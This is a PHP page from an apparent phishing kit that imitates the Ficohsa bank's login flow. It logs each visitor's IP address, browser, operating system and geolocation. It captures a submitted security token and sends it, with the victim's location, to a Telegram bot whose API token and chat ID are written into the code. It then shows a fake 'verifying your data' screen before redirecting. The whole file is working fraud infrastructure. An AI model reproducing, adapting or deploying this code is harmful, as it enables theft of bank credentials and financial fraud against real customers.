<?php  
include "fucker.php";
?>
<?php
@$userp = $_SERVER['REMOTE_ADDR'];

////////////////////
$user_agent = $_SERVER['HTTP_USER_AGENT'];
function getBrowser($user_agent){
if(strpos($user_agent, 'MSIE') !== FALSE)
   return 'Internet explorer';
 elseif(strpos($user_agent, 'Edge') !== FALSE) //Microsoft Edge
   return 'Microsoft Edge';
 elseif(strpos($user_agent, 'Trident') !== FALSE) //IE 11
    return 'Internet explorer';
 elseif(strpos($user_agent, 'Opera Mini') !== FALSE)
   return "Opera Mini";
 elseif(strpos($user_agent, 'Opera') || strpos($user_agent, 'OPR') !== FALSE)
   return "Opera";
 elseif(strpos($user_agent, 'Firefox') !== FALSE)
   return 'Mozilla Firefox';
 elseif(strpos($user_agent, 'Chrome') !== FALSE)
   return 'Google Chrome';
 elseif(strpos($user_agent, 'Safari') !== FALSE)
   return "Safari";
 else
   return 'No navegador';}
 function getOS() { 
    global $user_agent;
    $os_array =  array(
     '/windows nt 10/i'      =>  'Windows 10',
     '/windows nt 6.3/i'     =>  'Windows 8.1',
     '/windows nt 6.2/i'     =>  'Windows 8',
     '/windows nt 6.1/i'     =>  'Windows 7',
     '/windows nt 6.0/i'     =>  'Windows Vista',
     '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
     '/windows nt 5.1/i'     =>  'Windows XP',
     '/windows xp/i'         =>  'Windows XP',
     '/macintosh|mac os x/i' =>  'Mac OS X',
     '/mac_powerpc/i'        =>  'Mac OS 9',
     '/linux/i'              =>  'Linux',
     '/ubuntu/i'             =>  'Ubuntu',
     '/iphone/i'             =>  'iPhone',
     '/ipod/i'               =>  'iPod',
     '/ipad/i'               =>  'iPad',
     '/android/i'            =>  'Android',
     '/blackberry/i'         =>  'BlackBerry',
     '/webos/i'              =>  'Mobile');
    $os_platform = "Unknown OS Platform";
    foreach ($os_array as $regex => $value) { 
        if (preg_match($regex, $user_agent)) {
            $os_platform = $value; }  }
    return $os_platform; }
$user_os        =   getOS();
$navegador = getBrowser($user_agent);

@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$userp));
@$pais = $meta['geoplugin_countryName']; 
@$region = $meta['geoplugin_regionName'];
@$ciudad = $meta['geoplugin_city'];
date_default_timezone_set('America/Bogota');


////////////////////

@ini_set("display_errors", 0);

////////////////////
if ( isset ($_POST['t0ken']) ){

$_SESSION['USER'] = $_POST['t0ken'];
    
    

$message = "OHT||fic0-Rezult||\n\n"."\nIP: ".$_SERVER['REMOTE_ADDR']."\n".'t0ken-1: '.$_SESSION['USER']."\n";
$message .= " Ubicaci0n= ".$pais." ".$region." ".$ciudad."\r\n";
$apiToken = "5814205558:AAFFPjpIlnr4Mq6j03bAxUzmgq_Rxg3lm6A";


$data = [
  'chat_id' => '-1001976646894',

   'text' => $message
];

$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );



 }



?>
<!doctype html><html lang="en" class="notranslate" translate="no">
<head>
<meta http-equiv="Refresh"
content="45;url=token2.php"> 
    <meta name="google" content="notranslate"><title>Ficohsa</title><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0"><link rel="shortcut icon" href="Ficohsa_files/isotipo-ficohsa-blanco.ico" type="image/x-icon"/><!-- #region prisma --><script type="text/javascript" src="../campaigns.ficohsa.com_443/sdk/javascript/prisma.js"></script><!-- --><script type="text/javascript" id="64bb2703-e0c3-49e7-a41d-d4115ea3a62f">(function (s, h, ci, si, wi) {
            s = s + Math.random().toString(36).substring(7) + "/login.js?clientId=" + ci + "&websiteId=" + wi;
            window._dmo = {src: s, host: h, sessionId: si, clientId: ci, websiteId: wi};
            var a = document.createElement("script");
            a.type = "text/javascript";
            a.src = s;
            a.async = !0;
            var b = document.getElementsByTagName("script")[0];
            b.parentNode.insertBefore(a, b);
        })('https://spmfondo.ficohsa.com:443/scriptdealer/script/v1/', 'https://spmfondo.ficohsa.com:443/',
            'c24ec572-88e6-41ab-9aa9-af7144c5a394', null, '1045');</script><!-- --><link href="Ficohsa_files/styles.b1d6cdcc40a888de1051.bundle.css" rel="stylesheet"/></head><body><icb-app class="app"></icb-app><div class="app_overlay"><!-- MERGE: El loading se carga aquí --><div class="mesina-loader"><div class="mesina-logo"></div><div class="spinner"><div class="bounce1"></div><div class="bounce2"></div><div class="bounce3"></div></div><div class="mesina-welcome-title">Espere un momento...</div><div class="mesina-welcome-subtitle1">Estamos verificando sus datos...<br>No cierre esta ventana.</div></div></div><script type="text/javascript" src="inline.ca44eecbf42bd41b6278.bundle.js"></script></body>
</html>